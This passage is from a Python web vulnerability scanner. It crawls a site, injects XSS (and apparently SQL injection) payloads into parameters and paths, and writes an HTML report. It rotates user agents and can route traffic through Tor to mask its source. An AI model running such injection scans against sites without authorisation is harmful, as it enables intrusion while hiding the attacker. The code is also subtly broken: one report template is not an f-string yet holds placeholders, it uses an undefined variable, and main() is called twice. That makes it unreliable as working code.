                        session_manager.increment_error_count(url)
                
                if vulnerability_found:
                    break  # Stop testing other parameters if we found a vulnerability
                        
    except Exception as e:
        logger.error(f"Error testing {url}: {str(e)}")
        session_manager.increment_error_count(url)
    finally:
        tested_urls.add(url)

def test_xss(url):
    """Test XSS vulnerabilities in a URL."""
    global current_url
    current_url = url
    
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    session = session_manager.get_session()
    
    # Get baseline response for technology detection
    headers = {"User-Agent": get_random_user_agent()}
    baseline = get_baseline_response(url, session, headers)
    if baseline:
        # Detect technology stack
        tech_stack = session_manager.payload_generator.detect_technology(baseline)
        logger.debug(f"Detected technology stack: {tech_stack}")
    
    if query_params:
        # Get dynamically generated payloads based on technology
        if baseline:
            payloads = session_manager.payload_generator.generate_payloads(baseline, 'xss')
        else:
            payloads = PAYLOADS["XSS"]  # Fallback to default payloads
        
        # Test each parameter
        for param in query_params:
            # Test each payload for the current parameter
            for payload in payloads:
                test_params = query_params.copy()
                test_params[param] = payload
                test_url = parsed_url._replace(query=urlencode(test_params, doseq=True)).geturl()
                
                for attempt in range(config.config["max_retries"]):
                    try:
                        headers = {"User-Agent": get_random_user_agent()}
                        response = session.get(test_url, headers=headers, timeout=10)
                        if payload in response.text:
                            logger.info(f"XSS vulnerability found in {param} at {test_url}")
                            vulnerability_results["xss"].append((test_url, param))
                            # Break out of all loops since we found a vulnerability
                            return
                    except requests.RequestException as e:
                        logger.error(f"Attempt {attempt + 1} failed for {test_url}: {e}")
                        if attempt < config.config["max_retries"] - 1:
                            time.sleep(random.uniform(1, 5))
                        else:
                            logger.error(f"Max retries reached for {test_url}")
    else:
        # Test path-based XSS but stop on first vulnerability
        if baseline:
            payloads = session_manager.payload_generator.generate_payloads(baseline, 'xss')
        else:
            payloads = PAYLOADS["XSS"]  # Fallback to default payloads
            
        for payload in payloads:
            test_url = f"{url}/{payload}"
            for attempt in range(config.config["max_retries"]):
                try:
                    headers = {"User-Agent": get_random_user_agent()}
                    response = session.get(test_url, headers=headers, timeout=10)
                    if payload in response.text:
                        logger.info(f"XSS vulnerability found in path at {test_url}")
                        vulnerability_results["xss"].append((test_url, "path"))
                        return  # Exit function since we found a vulnerability
                except requests.RequestException as e:
                    logger.error(f"Attempt {attempt + 1} failed for {test_url}: {e}")
                    if attempt < config.config["max_retries"] - 1:
                        time.sleep(random.uniform(1, 5))
                    else:
                        logger.error(f"Max retries reached for {test_url}")
    
    # Mark the original URL as tested after all tests are complete
    tested_urls.add(url)

async def update_scan_progress():
    """Update scan progress and send data to both real-time reporter and web dashboard."""
    global links, tested_urls, current_url, vulnerability_results, training_data
    
    last_update = time.time()
    update_interval = 1.0  # Update every second
    
    while True:
        try:
            current_time = time.time()
            if current_time - last_update < update_interval:
                await asyncio.sleep(0.1)
                continue
                
            # Get accurate counts using thread-safe sets/lists
            total_urls = len(set(links)) if links else 0  # Use set to ensure unique URLs
            tested_count = len(tested_urls)  # tested_urls is already a set
            
            # Calculate total vulnerabilities
            total_vulns = (
                sum(len(vulns) for vulns in vulnerability_results["sqli"].values()) +
                len(vulnerability_results["xss"])
            )
            
            # Calculate accurate progress
            progress = (tested_count / total_urls * 100) if total_urls > 0 else 0
            progress = min(progress, 100)  # Cap at 100%
            
            # Count errors
            error_count = sum(1 for url in tested_urls if session_manager.error_counts[url] > 0)
            
            # Prepare vulnerability list
            vuln_list = []
            for vuln_type, vulns in vulnerability_results["sqli"].items():
                for url, param in vulns:
                    vuln_list.append({
                        'type': f'SQLi ({vuln_type})',
                        'url': url,
                        'details': f"Parameter: {param}"
                    })
            
            for url, param in vulnerability_results["xss"]:
                vuln_list.append({
                    'type': 'XSS',
                    'url': url,
                    'details': f"Parameter: {param}"
                })
            
            # Update vulnerability distribution
            vuln_dist = {}
            for vuln in vuln_list:
                vuln_type = vuln['type']
                vuln_dist[vuln_type] = vuln_dist.get(vuln_type, 0) + 1
            
            # Prepare stats update
            stats = {
                'total_urls': total_urls,
                'tested_urls': tested_count,
                'current_url': current_url,
                'vulnerabilities': vuln_list,
                'vulnerability_distribution': vuln_dist,
                'progress': progress,
                'response_times': [elapsed for _, elapsed in training_data[-10:]] if training_data else [],
                'error_rates': [session_manager.error_counts.get(url, 0) for url in (list(tested_urls)[-10:] if tested_urls else [])]
            }
            
            # Update both real-time reporter and web dashboard
            try:
                await real_time_reporter.update_stats(stats)
                web_dashboard.update_data(stats)
                logger.debug(
                    f"Progress update: {progress:.1f}% ({tested_count}/{total_urls} URLs, "
                    f"{total_vulns} vulnerabilities, {error_count} errors)"
                )
            except Exception as e:
                logger.error(f"Failed to update progress: {e}")
            
            last_update = current_time
            
            # If scan is complete, update one final time and break
            if progress >= 100 and tested_count >= total_urls:
                stats['scan_status'] = 'completed'
                stats['progress'] = 100
                stats['estimated_time_remaining'] = 0
                await real_time_reporter.update_stats(stats)
                web_dashboard.update_data(stats)
                break
                
            await asyncio.sleep(update_interval)
            
        except Exception as e:
            logger.error(f"Error in update_scan_progress: {e}")
            await asyncio.sleep(1)

async def run_scan(links):
    """Run the scan with proper async handling."""
    progress_task = None
    try:
        # Update scan status to running
        web_dashboard.scan_data['scan_status'] = 'running'
        web_dashboard.scan_data['start_time'] = time.time()
        
        # Start progress update task
        progress_task = asyncio.create_task(update_scan_progress())
        
        # Run test_links in a thread pool
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, test_links, links)
        
        # Update scan status to completed
        web_dashboard.scan_data['scan_status'] = 'completed'
        web_dashboard.scan_data['progress'] = 100
        web_dashboard.scan_data['estimated_time_remaining'] = 0
        
        # Generate final report that matches the web UI data
        website_name = urlparse(links[0]).netloc.replace('.', '_') if links else 'scan'
        report_file = generate_html_report(website_name)
        
        # Set the report path in the dashboard
        web_dashboard.set_report_path(report_file)
        
        logger.info(f"Scan completed. Report saved to: {report_file}")
        
    except Exception as e:
        logger.error(f"Error during scan: {e}")
        web_dashboard.scan_data['scan_status'] = 'error'
        raise
    finally:
        # Cancel progress task
        if progress_task:
            progress_task.cancel()
            try:
                await progress_task
            except asyncio.CancelledError:
                pass
            except Exception as e:
                logger.error(f"Error canceling progress task: {e}")

def generate_html_report(website_name: str):
    """Generate an HTML report that matches the web UI data."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_file = f"reports/{website_name}_report_{timestamp}.html"
    
    # Create reports directory if it doesn't exist
    os.makedirs("reports", exist_ok=True)
    
    # Use the same data as the web UI
    scan_data = web_dashboard.scan_data
    
    # Calculate statistics
    total_vulns = len(scan_data['vulnerabilities'])
    vuln_types = scan_data['vulnerability_distribution']
    
    html_content = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Security Scan Report - {website_name}</title>
        <script src="https://cdn.plot.ly/plotly-latest.min.js"></script>
        <style>
            :root {{
                --primary-color: #2196F3;
                --success-color: #4CAF50;
                --warning-color: #FFC107;
                --danger-color: #F44336;
                --text-color: #FFFFFF;
                --bg-color: #1a1a1a;
                --card-bg: #2d2d2d;
                --border-color: #404040;
            }}
            
            * {{
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }}
            
            body {{
                background-color: var(--bg-color);
                color: var(--text-color);
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                line-height: 1.6;
                margin: 0;
                padding: 20px;
            }}
            
            .container {{
                max-width: 1200px;
                margin: 0 auto;
                padding: 20px;
            }}
            
            .header {{
                background-color: var(--card-bg);
                border-radius: 10px;
                padding: 20px;
                margin-bottom: 20px;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            }}
            
            .header h1 {{
                color: var(--primary-color);
                font-size: 2.5em;
                margin-bottom: 10px;
            }}
            
            .header h2 {{
                color: var(--text-color);
                font-size: 1.8em;
                margin-bottom: 10px;
                opacity: 0.9;
            }}
            
            .header p {{
                color: var(--text-color);
                opacity: 0.7;
            }}
            
            .stats-grid {{
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 20px;
                margin-bottom: 30px;
            }}
            
            .stat-card {{
                background-color: var(--card-bg);
                border-radius: 10px;
                padding: 20px;
                text-align: center;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                transition: transform 0.3s ease;
            }}
            
            .stat-card:hover {{
                transform: translateY(-5px);
            }}
            
            .stat-number {{
                font-size: 2.5em;
                font-weight: bold;
                margin-bottom: 10px;
                color: var(--primary-color);
            }}
            
            .stat-label {{
                font-size: 1.1em;
                color: var(--text-color);
                opacity: 0.8;
            }}
            
            .chart-container {{
                background-color: var(--card-bg);
                border-radius: 10px;
                padding: 20px;
                margin-bottom: 30px;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            }}
            
            .chart-title {{
                font-size: 1.5em;
                margin-bottom: 20px;
                color: var(--text-color);
                opacity: 0.9;
            }}
            
            .vulnerability-section {{
                background-color: var(--card-bg);
                border-radius: 10px;
                padding: 20px;
                margin-bottom: 30px;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            }}
            
            .vulnerability-section h2 {{
                color: var(--text-color);
                font-size: 1.8em;
                margin-bottom: 20px;
                opacity: 0.9;
            }}
            
            .vulnerability-grid {{
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                gap: 20px;
            }}
            
            .vulnerability-card {{
                background-color: rgba(244, 67, 54, 0.1);
                border-left: 4px solid var(--danger-color);
                border-radius: 5px;
                padding: 15px;
                transition: transform 0.3s ease;
            }}
            
            .vulnerability-card:hover {{
                transform: translateX(5px);
            }}
            
            .vulnerability-type {{
                color: var(--danger-color);
                font-weight: bold;
                font-size: 1.1em;
                margin-bottom: 10px;
            }}
            
            .vulnerability-details {{
                color: var(--text-color);
                opacity: 0.8;
                margin-bottom: 5px;
            }}
            
            .vulnerability-url {{
                color: var(--primary-color);
                word-break: break-all;
                font-family: monospace;
                font-size: 0.9em;
            }}
            
            .progress-section {{
                background-color: var(--card-bg);
                border-radius: 10px;
                padding: 20px;
                margin-bottom: 30px;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            }}
            
            .progress-bar {{
                height: 20px;
                background-color: rgba(33, 150, 243, 0.1);
                border-radius: 10px;
                overflow: hidden;
                margin-top: 10px;
            }}
            
            .progress-fill {{
                height: 100%;
                background-color: var(--primary-color);
                width: {scan_data['progress']}%;
                transition: width 0.3s ease;
            }}
            
            @media (max-width: 768px) {{
                .container {{
                    padding: 10px;
                }}
                
                .stat-card {{
                    padding: 15px;
                }}
                
                .vulnerability-grid {{
                    grid-template-columns: 1fr;
                }}
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>Security Scan Report</h1>
                <h2>{website_name}</h2>
                <p>Scan completed on: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
            </div>
            
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-number">{scan_data['total_urls']}</div>
                    <div class="stat-label">Total URLs</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{scan_data['tested_urls']}</div>
                    <div class="stat-label">Tested URLs</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{total_vulns}</div>
                    <div class="stat-label">Total Vulnerabilities</div>
                </div>
            </div>
            
            <div class="scan-status-container">
                <div class="progress-section">
                    <h2 class="chart-title">Scan Progress</h2>
                    <div class="progress-bar">
                        <div class="progress-fill" style="width: {scan_data['progress']}%;"></div>
                    </div>
                    <p style="margin-top: 10px; text-align: center;">{scan_data['progress']:.1f}% Complete</p>
                </div>
                <button id="viewResultsBtn" class="view-results-btn" onclick="scrollToResults()">View Results</button>
            </div>
            
            <style>
                .scan-status-container {{
                    display: flex;
                    align-items: center;
                    justify-content: space-between;
                    background-color: var(--card-bg);
                    border-radius: 10px;
                    padding: 20px;
                    margin-bottom: 30px;
                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                }}
                
                .progress-section {{
                    flex: 1;
                    margin-right: 20px;
                }}
                
                .view-results-btn {{
                    background-color: var(--primary-color);
                    color: white;
                    border: none;
                    border-radius: 5px;
                    padding: 10px 20px;
                    font-size: 1.1em;
                    cursor: pointer;
                    transition: all 0.3s ease;
                    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
                }}
                
                .view-results-btn:hover {{
                    transform: translateY(-2px);
                    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
                }}
                
                .view-results-btn:active {{
                    transform: translateY(0);
                }}
                
                .vulnerability-section {{
                    scroll-margin-top: 20px;
                }}
            </style>
            
            <div class="chart-container">
                <h2 class="chart-title">Vulnerability Distribution</h2>
                <div id="vulnerability-distribution"></div>
            </div>
            
            <div class="chart-container">
                <h2 class="chart-title">Response Times</h2>
                <div id="response-times"></div>
            </div>
            
            <div id="vulnerabilities" class="vulnerability-section">
                <h2>Detected Vulnerabilities</h2>
                <div class="vulnerability-grid">
    """
    
    # Add vulnerabilities from scan_data
    for vuln in scan_data['vulnerabilities']:
        html_content += f"""
                    <div class="vulnerability-card">
                        <div class="vulnerability-type">{vuln['type']}</div>
                        <div class="vulnerability-details">{vuln['details']}</div>
                        <div class="vulnerability-url">{vuln['url']}</div>
                    </div>
        """
    
    html_content += """
                </div>
            </div>
        </div>
        
        <script>
            // Add scroll to results function
            function scrollToResults() {
                document.getElementById('vulnerabilities').scrollIntoView({ 
                    behavior: 'smooth',
                    block: 'start'
                });
            }
            
            // Vulnerability Distribution Chart
            const vulnDist = document.getElementById('vulnerability-distribution');
            const vulnData = {{
                labels: {json.dumps(vuln_types)},
                values: {json.dumps(vuln_counts)},
                type: 'pie',
                textinfo: 'label+percent',
                insidetextorientation: 'radial',
                marker: {{
                    colors: ['#F44336', '#2196F3', '#4CAF50', '#FFC107', '#9C27B0']
                }}
            }};
            
            const vulnLayout = {{
                paper_bgcolor: '#2d2d2d',
                plot_bgcolor: '#2d2d2d',
                font: {{ color: '#ffffff' }},
                showlegend: true,
                legend: {{ orientation: 'h', y: -0.2 }}
            }};
            
            Plotly.newPlot('vulnerability-distribution', [vulnData], vulnLayout);
            
            // Response Times Chart
            const respTimes = document.getElementById('response-times');
            const timeData = {{
                y: {json.dumps(scan_data['response_times'])},
                type: 'scatter',
                mode: 'lines+markers',
                line: {{ color: '#2196F3' }},
                marker: {{ color: '#2196F3' }}
            }};
            
            const timeLayout = {{
                paper_bgcolor: '#2d2d2d',
                plot_bgcolor: '#2d2d2d',
                font: {{ color: '#ffffff' }},
                title: {{ text: 'Response Times (seconds)', font: {{ color: '#ffffff' }} }},
                xaxis: {{ title: 'Request Number', gridcolor: '#404040', color: '#ffffff' }},
                yaxis: {{ title: 'Response Time (s)', gridcolor: '#404040', color: '#ffffff' }}
            }};
            
            Plotly.newPlot('response-times', [timeData], timeLayout);
        </script>
    </body>
    </html>
    """
    
    with open(report_file, 'w', encoding='utf-8') as f:
        f.write(html_content)
    
    logger.info(f"Generated HTML report: {report_file}")
    return report_file

def test_links(links: List[str]):
    """Test vulnerabilities in all crawled links with improved threading."""
    global training_data, response_analyzer, ml_detector, tested_urls, current_url
    
    # Use set for links to ensure uniqueness
    unique_links = list(set(links))
    total_links = len(unique_links)
    
    # Train the model with baseline data before testing
    if training_data:
        logger.info(f"Training anomaly detection model with {len(training_data)} baseline samples")
        response_analyzer.train(training_data)
    else:
        logger.warning("No baseline data collected for anomaly detection model")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=config.config["max_threads"]) as executor:
        futures = []
        for url in unique_links:
            if config.config["scan_options"]["test_sqli"]:
                futures.append(executor.submit(test_sqli, url))
            if config.config["scan_options"]["test_xss"]:
                futures.append(executor.submit(test_xss, url))
        
        with tqdm(total=len(futures), desc="Testing URLs", unit="url") as pbar:
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logger.error(f"Error during vulnerability testing: {e}")
                finally:
                    pbar.update(1)
    
    # Ensure all URLs are marked as tested
    tested_urls.update(unique_links)
    
    # Log final statistics
    logger.info(f"Completed testing {len(tested_urls)}/{total_links} unique URLs")
    if response_analyzer and response_analyzer.model is not None:
        logger.info("Anomaly detection model is active and monitoring responses")
    else:
        logger.warning("Anomaly detection model is not available")

def save_urls_to_file(urls: List[str], website_name: str) -> str:
    """Save URLs to a text file named after the website."""
    filename = f"urls/{website_name}_urls.txt"
    os.makedirs("urls", exist_ok=True)
    
    with open(filename, 'w', encoding='utf-8') as f:
        for url in urls:
            f.write(f"{url}\n")
    logger.info(f"Saved {len(urls)} URLs to {filename}")
    return filename

def load_urls_from_file(filename: str) -> List[str]:
    """Load URLs from a text file."""
    if not os.path.exists(filename):
        logger.error(f"File {filename} not found!")
        return []
    with open(filename, 'r', encoding='utf-8') as f:
        urls = [line.strip() for line in f if line.strip()]
    logger.info(f"Loaded {len(urls)} URLs from {filename}")
    return urls

class ResponseAnalyzer:
    def __init__(self, website_name: str):
        self.website_name = website_name
        self.model_path = f"models/{website_name}_anomaly_detection.joblib"
        self.model = None
        self.scaler = StandardScaler()
        self.feature_names = [
            'response_length', 'response_time', 'status_code',
            'header_count', 'content_type', 'html_tag_count',
            'script_count', 'link_count', 'form_count',
            'input_count', 'button_count', 'div_count'
        ]

    def load_model(self):
        """Load the trained model if it exists."""
        if os.path.exists(self.model_path):
            try:
                saved_data = joblib.load(self.model_path)
                self.model = saved_data['model']
                self.scaler = saved_data['scaler']
                logger.info(f"Loaded existing anomaly detection model from {self.model_path}")
            except Exception as e:
                logger.error(f"Failed to load model from {self.model_path}: {e}")
                self.model = None
                logger.info("Will create new model")
        else:
            self.model = None
            logger.info(f"No model found at {self.model_path}. Will create new model.")

    def load_custom_model(self, custom_path: str):
        """Load a model from a custom path."""
        if os.path.exists(custom_path):
            try:
                saved_data = joblib.load(custom_path)
                self.model = saved_data['model']
                self.scaler = saved_data['scaler']
                self.model_path = custom_path  # Update model path to custom path
                logger.info(f"Successfully loaded custom model from {custom_path}")
            except Exception as e:
                logger.error(f"Failed to load custom model from {custom_path}: {e}")
                self.model = None
                logger.info("Will create new model")
        else:
            logger.error(f"Custom model file not found at {custom_path}")
            self.model = None
            logger.info("Will create new model")

    def save_model(self):
        """Save the trained model."""
        os.makedirs(os.path.dirname(self.model_path), exist_ok=True)
        try:
            saved_data = {
                'model': self.model,
                'scaler': self.scaler,
                'website_name': self.website_name,
                'training_date': datetime.now().isoformat()
            }
            joblib.dump(saved_data, self.model_path)
            logger.info(f"Saved anomaly detection model for {self.website_name} to {self.model_path}")
        except Exception as e:
            logger.error(f"Failed to save model: {e}")

    def extract_features(self, response: requests.Response, elapsed_time: float) -> np.ndarray:
        """Extract features from the response."""
        try:
            soup = BeautifulSoup(response.text, 'html.parser')
            features = [
                len(response.text),  # response_length
                elapsed_time,  # response_time
                response.status_code,  # status_code
                len(response.headers),  # header_count
                1 if 'text/html' in response.headers.get('Content-Type', '').lower() else 0,  # content_type
                len(soup.find_all()),  # html_tag_count
                len(soup.find_all('script')),  # script_count
                len(soup.find_all('a')),  # link_count
                len(soup.find_all('form')),  # form_count
                len(soup.find_all('input')),  # input_count
                len(soup.find_all('button')),  # button_count
                len(soup.find_all('div'))  # div_count
            ]
            return np.array(features).reshape(1, -1)
        except Exception as e:
            logger.error(f"Failed to extract features: {e}")
            return None

    def train(self, responses: List[Tuple[requests.Response, float]]):
        """Train the anomaly detection model."""
        if not responses:
            logger.warning("No responses provided for training")
            return

        try:
            # Extract features from all responses
            features = []
            for response, elapsed_time in responses:
                feature_vector = self.extract_features(response, elapsed_time)
                if feature_vector is not None:
                    features.append(feature_vector[0])

            if not features:
                logger.warning("No valid features extracted for training")
                return

            # Convert to numpy array and scale features
            X = np.array(features)
            X_scaled = self.scaler.fit_transform(X)

            # Train Isolation Forest
            self.model = IsolationForest(
                contamination=0.1,  # Expected proportion of anomalies
                random_state=42,
                n_estimators=100
            )
            self.model.fit(X_scaled)
            logger.info(f"Successfully trained anomaly detection model with {len(features)} samples")
            self.save_model()

        except Exception as e:
            logger.error(f"Failed to train model: {e}")

    def predict(self, response: requests.Response, elapsed_time: float) -> Tuple[bool, float]:
        """Predict if the response is anomalous."""
        if self.model is None:
            return False, 0.0

        try:
            features = self.extract_features(response, elapsed_time)
            if features is None:
                return False, 0.0

            # Scale features
            features_scaled = self.scaler.transform(features)
            
            # Predict anomaly score (-1 for anomaly, 1 for normal)
            score = self.model.score_samples(features_scaled)[0]
            
            # Convert score to probability (higher score = more likely to be normal)
            probability = 1 / (1 + np.exp(-score))
            
            # Consider it anomalous if probability < 0.5
            is_anomaly = probability < 0.5
            
            if is_anomaly:
                logger.debug(f"Anomaly detected with probability {probability:.2f}")
            
            return is_anomaly, probability

        except Exception as e:
            logger.error(f"Failed to predict anomaly: {e}")
            return False, 0.0

def check_existing_models(website_name: str) -> Optional[str]:
    """Check if there are any existing models for the website."""
    models_dir = "models"
    if not os.path.exists(models_dir):
        return None
    
    # Look for any model files matching the website name pattern
    model_files = [f for f in os.listdir(models_dir) if f.startswith(website_name) and f.endswith('_anomaly_detection.joblib')]
    return model_files[0] if model_files else None

def get_user_model_choice(website_name: str) -> Tuple[bool, Optional[str]]:
    """Ask user if they want to use an existing model or create a new one."""
    while True:
        print(f"\nFor website: {website_name}")
        print("1. Use existing model")
        print("2. Create new model")
        print("3. I have a model file")
        choice = input("Enter your choice (1, 2, or 3): ").strip()
        
        if choice == '1':
            return True, None
        elif choice == '2':
            return False, None
        elif choice == '3':
            model_path = input("Enter the path to your model file: ").strip()
            if os.path.exists(model_path):
                return True, model_path
            else:
                print("Model file not found. Please try again.")
        else:
            print("Invalid choice. Please enter 1, 2, or 3.")

def check_tor_connection():
    """Check if Tor is running and accessible."""
    if not config.config["proxy"]["enabled"]:
        return True
        
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            return True
    except Exception as e:
        logger.warning(f"Tor is not running or not accessible: {e}")
        logger.info("To use Tor, please start the Tor service first.")
        return False

# Add these global variables at the top of the file, after the imports
links = []
tested_urls = set()
current_url = ""
vulnerability_results = {
    "sqli": {
        "error-based": [],
        "time-based": [],
        "boolean/union-based": []
    },
    "xss": []
}
training_data = []

# Update the main function to properly handle async tasks
def main():
    global links, tested_urls, current_url, vulnerability_results, training_data, response_analyzer, ml_detector, real_time_reporter, web_dashboard
    
    try:
        # Reset global variables
        links = []
        tested_urls = set()
        current_url = ""
        vulnerability_results = {
            "sqli": {
                "error-based": [],
                "time-based": [],
                "boolean/union-based": []
            },
            "xss": []
        }
        training_data = []
        
        # Initialize new components
        ml_detector = MLDetector()
        real_time_reporter = RealTimeReporter()
        web_dashboard = WebDashboard()
        
        # Create event loop
        if not asyncio.get_event_loop().is_running():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        else:
            loop = asyncio.get_event_loop()
        
        # Start real-time reporting server and web dashboard
        server = loop.run_until_complete(real_time_reporter.start_server())
        web_dashboard.start()
        
        # Parse command line arguments
        parser = argparse.ArgumentParser(description='Web Application Vulnerability Scanner')
        parser.add_argument('--url', help='URL to scan')
        parser.add_argument('--file', help='File containing URLs to scan')
        parser.add_argument('--depth', type=int, default=2, help='Maximum crawl depth')
        parser.add_argument('--threads', type=int, help='Number of concurrent threads')
        parser.add_argument('--no-tor', action='store_true', help='Disable Tor proxy')
        parser.add_argument('--verify-ssl', action='store_true', help='Enable SSL verification')
        parser.add_argument('--output-dir', help='Directory for output files')
        parser.add_argument('--max-errors', type=int, default=5, help='Maximum number of errors per URL before skipping')
        parser.add_argument('--add-signature', nargs=3, metavar=('CATEGORY', 'PATTERN', 'DESCRIPTION'),
                           help='Add a new custom vulnerability signature')
        parser.add_argument('--list-signatures', action='store_true',
                           help='List all custom vulnerability signatures')
        parser.add_argument('--ml-model', help='Path to custom ML model file')
        parser.add_argument('--no-ml', action='store_true', help='Disable ML-based detection')
        
        args = parser.parse_args()
        
        # Check if no arguments were provided
        if not any([args.url, args.file, args.add_signature, args.list_signatures]):
            parser.print_help()
            return
        
        # Handle signature management arguments
        if args.add_signature:
            category, pattern, description = args.add_signature
            session_manager.signature_manager.add_signature(category, pattern, description)
            session_manager.signature_manager.save_signatures()
            logger.info(f"Added new signature for {category}")
            return
        
        if args.list_signatures:
            for category, sigs in session_manager.signature_manager.signatures.items():
                print(f"\n{category.upper()} Signatures:")
                for sig in sigs:
                    print(f"- Pattern: {sig['pattern']}")
                    print(f"  Description: {sig['description']}")
            return
        
        # Update configuration based on command-line arguments
        if args.threads:
            config.config["max_threads"] = args.threads
        if args.no_tor:
            config.config["proxy"]["enabled"] = False
        if args.verify_ssl:
            config.config["verify_ssl"] = True
        if args.output_dir:
            os.makedirs(args.output_dir, exist_ok=True)
        if args.no_ml:
            config.config["ml_detection"]["enabled"] = False
        
        # Check Tor connection if enabled
        if config.config["proxy"]["enabled"] and not check_tor_connection():
            logger.warning("Tor is not available. Running without proxy.")
            config.config["proxy"]["enabled"] = False
        
        # Initialize variables for async task
        links = []
        current_url = ""
        
        if args.url:
            url = args.url
            if not url.startswith(("http://", "https://")):
                url = "http://" + url
            website_name = urlparse(url).netloc.replace('.', '_')
            logger.info(f"Starting new scan for {url}")
            
            # Initialize response analyzer
            response_analyzer = ResponseAnalyzer(website_name)
            
            # Handle ML model initialization
            if config.config["ml_detection"]["enabled"]:
                if args.ml_model:
                    response_analyzer.load_custom_model(args.ml_model)
                else:
                    existing_model = check_existing_models(website_name)
                    if existing_model:
                        use_existing, custom_model_path = get_user_model_choice(website_name)
                        if use_existing:
                            if custom_model_path:
                                response_analyzer.load_custom_model(custom_model_path)
                            else:
                                response_analyzer.load_model()
            
            links = crawl(url, args.depth)
            logger.info(f"Found {len(links)} links")
            
            if links:
                save_urls_to_file(links, website_name)
                loop.run_until_complete(run_scan(links))
                report_file = generate_html_report(website_name)
                logger.info(f"Scan completed. Report saved to: {report_file}")
            else:
                logger.warning("No links found to test")
            
        elif args.file:
            links = load_urls_from_file(args.file)
            if links:
                # Extract website name from the first URL in the file
                try:
                    first_url = links[0]
                    if not first_url.startswith(("http://", "https://")):
                        first_url = "http://" + first_url
                    website_name = urlparse(first_url).netloc.replace('.', '_')
                except Exception as e:
                    logger.error(f"Failed to extract website name from URLs: {e}")
                    # Fallback to filename without extension and _urls suffix
                    website_name = os.path.splitext(os.path.basename(args.file))[0].replace('_urls', '')
                
                logger.info(f"Using website name: {website_name}")
                
                # Initialize response analyzer
                response_analyzer = ResponseAnalyzer(website_name)
                
                # Handle ML model initialization
                if config.config["ml_detection"]["enabled"]:
                    if args.ml_model:
                        response_analyzer.load_custom_model(args.ml_model)
                    else:
                        existing_model = check_existing_models(website_name)
                        if existing_model:
                            use_existing, custom_model_path = get_user_model_choice(website_name)
                            if use_existing:
                                if custom_model_path:
                                    response_analyzer.load_custom_model(custom_model_path)
                                else:
                                    response_analyzer.load_model()
                
                # Collect baseline data first
                logger.info("Collecting baseline data for anomaly detection...")
                with tqdm(total=len(links), desc="Collecting baseline data", unit="url") as pbar:
                    for url in links:
                        try:
                            response = make_request(url)
                            if response:
                                training_data.append((response, 0.0))
                        except Exception as e:
                            logger.error(f"Failed to collect baseline data from {url}: {e}")
                        pbar.update(1)
                
                if training_data:
                    logger.info(f"Collected baseline data from {len(training_data)} URLs")
                    # Train the model with baseline data
                    response_analyzer.train(training_data)
                else:
                    logger.warning("No baseline data collected. Proceeding without anomaly detection.")
                
                logger.info(f"Testing {len(links)} loaded links")
                loop.run_until_complete(run_scan(links))
                report_file = generate_html_report(website_name)
                logger.info(f"Scan completed. Report saved to: {report_file}")
            else:
                logger.error("No links to test. Please check the file or start a new scan with --url")
    
    except KeyboardInterrupt:
        logger.info("Scan interrupted by user")
    except Exception as e:
        logger.error(f"An error occurred: {e}")
        raise
    finally:
        try:
            # Cleanup
            if 'session_manager' in globals():
                try:
                    if config.config["proxy"]["enabled"]:
                        session_manager.rotate_proxy()
                except Exception as e:
                    logger.warning(f"Failed to rotate Tor circuit during cleanup: {e}")
            
            # Cleanup servers and event loop
            if 'server' in locals():
                server.close()
                if 'loop' in locals():
                    loop.run_until_complete(server.wait_closed())
            
            if 'loop' in locals():
                loop.close()
            
            logger.info("Scan finished")
        except Exception as e:
            logger.error(f"Error during cleanup: {e}")

if __name__ == "__main__":
    main()
    main()
